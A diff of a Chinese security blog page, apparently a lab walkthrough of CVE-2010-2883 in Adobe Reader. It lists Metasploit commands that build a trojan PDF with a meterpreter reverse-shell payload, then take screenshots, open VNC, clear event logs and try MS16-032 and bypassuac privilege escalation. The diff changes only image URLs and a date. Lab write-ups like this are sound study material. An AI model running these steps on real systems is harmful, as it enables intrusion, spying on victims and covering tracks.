@@ -41,8 +41,8 @@
     <script src="https://test1.jsdelivr.net/gh/enomothem/cdn@1.5.0/sources/libs/jquery/jquery.min.js"></script>
 
 <meta name="generator" content="Hexo 5.4.0">
-<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
 
 
 
@@ -637,7 +637,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-16
+                    2022-06-01
                 </div>
                 
 
@@ -674,7 +674,7 @@
                 <h1 id="复现CVE-2010-2883"><a href="#复现CVE-2010-2883" class="headerlink" title="复现CVE-2010-2883"></a><a target="_blank" rel="noopener" href="https://enomothem.cn/posts/6aa5">复现CVE-2010-2883</a></h1><blockquote>
 <p>MSF奉上。</p>
 </blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207212604350.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/image-20201207212604350.png"></p>
 <h2 id="Ax-介绍-Introduction"><a href="#Ax-介绍-Introduction" class="headerlink" title="Ax 介绍 Introduction"></a>Ax 介绍 <em>Introduction</em></h2><p>Adobe Reader和Acrobat都是美国奥多比（Adobe）公司的产品。Adobe Reader是一款免费的PDF文件阅读器，Acrobat是一款PDF文件编辑和转换工具。 基于Window和Mac OS X的Adobe Reader和Acrobat 9.4之前的9.x版本，8.2.5之前的8.x版本的CoolType.dll中存在基于栈的缓冲区溢出漏洞。远程攻击者可借助带有TTF字体Smart INdependent Glyphlets (SING)表格中超长字段的PDF文件执行任意代码或者导致拒绝服务（应用程序崩溃）。</p>
 <h4 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h4><ul>
 <li>Adobe Acrobat 8.0</li>
@@ -740,17 +740,17 @@
 <p>Adobe Reader 9.3</p>
 </blockquote>
 <p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Br3jLbGeOPMGxHC1bn_wLw">https://pan.baidu.com/s/1Br3jLbGeOPMGxHC1bn_wLw</a>  提取码：7srb </p>
-<h4 id="a-在靶机上安装Adobe-Reader"><a href="#a-在靶机上安装Adobe-Reader" class="headerlink" title="a 在靶机上安装Adobe Reader"></a>a 在靶机上安装Adobe Reader</h4><p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207205337563.png"></p>
+<h4 id="a-在靶机上安装Adobe-Reader"><a href="#a-在靶机上安装Adobe-Reader" class="headerlink" title="a 在靶机上安装Adobe Reader"></a>a 在靶机上安装Adobe Reader</h4><p><img src="https://lit.enomothem.com/brackets/image-20201207205337563.png"></p>
 <h4 id="b-在Kali上准备PDF木马文件拷贝到靶机上"><a href="#b-在Kali上准备PDF木马文件拷贝到靶机上" class="headerlink" title="b 在Kali上准备PDF木马文件拷贝到靶机上"></a>b 在Kali上准备PDF木马文件拷贝到靶机上</h4><h5 id="1-打开MSF"><a href="#1-打开MSF" class="headerlink" title="1 打开MSF"></a>1 打开MSF</h5><p><code># msfconsole </code></p>
 <h5 id="2-搜索adobe模块"><a href="#2-搜索adobe模块" class="headerlink" title="2 搜索adobe模块"></a>2 搜索adobe模块</h5><p><code># search adobe_cooltype_sing</code></p>
 <h5 id="3-调用exp模块"><a href="#3-调用exp模块" class="headerlink" title="3 调用exp模块"></a>3 调用exp模块</h5><p><code># use exploit/windows/fileformat/adobe_cooltype_sing/ </code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207212912244.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/image-20201207212912244.png"></p>
 <h5 id="4-调用meterpreter载荷，反向连接到渗透机"><a href="#4-调用meterpreter载荷，反向连接到渗透机" class="headerlink" title="4 调用meterpreter载荷，反向连接到渗透机"></a>4 调用meterpreter载荷，反向连接到渗透机</h5><p><code># set payload windows/meterpreter/reverse_tcp</code></p>
 <h5 id="5-设置Kali地址"><a href="#5-设置Kali地址" class="headerlink" title="5 设置Kali地址"></a>5 设置Kali地址</h5><p><code># set LHOST 192.168.66.133</code></p>
 <h5 id="6-设置本地监听端口"><a href="#6-设置本地监听端口" class="headerlink" title="6 设置本地监听端口"></a>6 设置本地监听端口</h5><p><code># set LPORT 8888</code></p>
 <h5 id="7-设置PDF文件名"><a href="#7-设置PDF文件名" class="headerlink" title="7 设置PDF文件名"></a>7 设置PDF文件名</h5><p><code># set FILENAME Girl.pdf</code></p>
 <h5 id="8-生成PDF木马文件"><a href="#8-生成PDF木马文件" class="headerlink" title="8 生成PDF木马文件"></a>8 生成PDF木马文件</h5><p><code># exploit</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207214659506.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/image-20201207214659506.png"></p>
 <blockquote>
 <p>然后将这个PDF文件拷贝到靶机Windows 7上。</p>
 </blockquote>
@@ -762,29 +762,29 @@
 <h4 id="c-设置监听的IP地址"><a href="#c-设置监听的IP地址" class="headerlink" title="c 设置监听的IP地址"></a>c 设置监听的IP地址</h4><p><code> set LHOST 192.168.66.133</code></p>
 <h4 id="d-设置监听的端口"><a href="#d-设置监听的端口" class="headerlink" title="d 设置监听的端口"></a>d 设置监听的端口</h4><p><code># set LPORT 8888</code></p>
 <h4 id="e-开始监听"><a href="#e-开始监听" class="headerlink" title="e 开始监听"></a>e 开始监听</h4><p><code># exploit</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207220039969.png"></p>
-<h2 id="Dx-攻击-Exploit"><a href="#Dx-攻击-Exploit" class="headerlink" title="Dx 攻击 Exploit"></a>Dx 攻击 <em>Exploit</em></h2><p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207222022961.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/image-20201207220039969.png"></p>
+<h2 id="Dx-攻击-Exploit"><a href="#Dx-攻击-Exploit" class="headerlink" title="Dx 攻击 Exploit"></a>Dx 攻击 <em>Exploit</em></h2><p><img src="https://lit.enomothem.com/brackets/image-20201207222022961.png"></p>
 <p>不得不说，defender是真强，直接给干掉了，所以这就是我电脑只留一个Defender的原因。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207223217215.png"></p>
-<h4 id="a-点一下这个Girl"><a href="#a-点一下这个Girl" class="headerlink" title="a 点一下这个Girl"></a>a 点一下这个Girl</h4><p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207223643747.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/image-20201207223217215.png"></p>
+<h4 id="a-点一下这个Girl"><a href="#a-点一下这个Girl" class="headerlink" title="a 点一下这个Girl"></a>a 点一下这个Girl</h4><p><img src="https://lit.enomothem.com/brackets/image-20201207223643747.png"></p>
 <p>Okay，立马上线，Win7那边会卡一下，如果卡住了，耐心等待一下，这边已经OK。</p>
 <h4 id="b-简单玩玩后渗透"><a href="#b-简单玩玩后渗透" class="headerlink" title="b 简单玩玩后渗透"></a>b 简单玩玩后渗透</h4><p>我们可以截图</p>
 <p><code>screenshot</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207224100660.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/image-20201207224100660.png"></p>
 <p>看看远程桌面啊</p>
 <p><code>run vnc</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207224337469.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/image-20201207224337469.png"></p>
 <p>清除日志。</p>
 <p><code>clearev</code></p>
 <p>不行，权限不够</p>
 <p><code>shell</code></p>
 <h4 id="c-提权"><a href="#c-提权" class="headerlink" title="c 提权"></a>c 提权</h4><p>1 查看当前权限</p>
 <p><code>whoami /groups</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207225219024.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/image-20201207225219024.png"></p>
 <p>当前权限是Mandatory Lable\Medium Mandatory Level 说明我们是一个标准用户，那么就需要将用户权限从标准用户提升到管理员，也就是Mandatory Lable\High Mandatory Level。</p>
 <p>2 查看补丁情况</p>
 <p><code>systeminfo</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207230547366.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/image-20201207230547366.png"></p>
 <p>我们就用最新的MS16-032来尝试提权，对应编号是KB3139914.</p>
 <p>3 回到控制台</p>
 <p><code>Ctrl + C</code>  // y</p>
@@ -792,32 +792,32 @@
 <p>4 搜索MS16-032</p>
 <p><code>search MS16-032</code></p>
 <p><code>use 0</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207231420462.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/image-20201207231420462.png"></p>
 <p>5 设置session</p>
 <p><code>set session 1</code></p>
 <p>6 设置target（默认是0，32位的）</p>
 <p><code> target 1</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207231624001.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/image-20201207231624001.png"></p>
 <p>没有成功，别灰心。</p>
 <p>7 bypassuac提权</p>
 <p><code>use exploit/windows/local/bypassuac</code></p>
 <p><code>set session 1</code></p>
 <p><code>exploit</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207232837348.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/image-20201207232837348.png"></p>
 <p>又失败了呀。再试试别的吧。</p>
 <blockquote>
 <p>正当我准备去找别的提权方法时，顺手再次尝试了一次exploit，没想到成功了！</p>
 </blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207233145450.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/image-20201207233145450.png"></p>
 <p>毛线哦，这。。。</p>
 <blockquote>
 <p>正当我准备去睡觉时，我输出提权试试。没想到成功了！</p>
 </blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207233529045.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/image-20201207233529045.png"></p>
 <p>原来我一直误解了clearev的意思，那个？？？？乱码是没有这个命令的意思。并不是权限不够。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207233909621.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/image-20201207233909621.png"></p>
 <p>这个直接到meterpreter上输入的。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20201207233950261.png"></p>
+<p><img src="https://lit.enomothem.com/brackets/image-20201207233950261.png"></p>
 <p>Successfully!</p>
 <h2 id="Ex-声明-Declaration"><a href="#Ex-声明-Declaration" class="headerlink" title="Ex 声明 Declaration"></a>Ex 声明 <em>Declaration</em></h2><ul>
 <li>请遵守，爱护《中华人民共和国网络安全法》</li>
